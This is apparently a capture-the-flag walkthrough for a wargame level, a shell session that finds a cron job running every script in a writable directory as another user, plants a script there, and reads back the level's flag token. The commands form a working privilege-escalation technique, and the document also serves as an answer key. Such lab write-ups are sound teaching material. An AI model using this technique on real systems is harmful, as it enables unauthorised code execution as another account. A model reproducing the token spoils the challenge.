```sh
$> find / -name level05 2>/dev/null
/var/mail/level05

$> cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

$> cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
# it executes the all scripts found in /opt/openarenaserver/

$> crontab /var/mail/level05

$> crontab -l
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

$> echo '/bin/getflag > /tmp/flag' > /opt/openarenaserver/script

# Just wait a little bit (may take up to 2 minutes)
$> cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
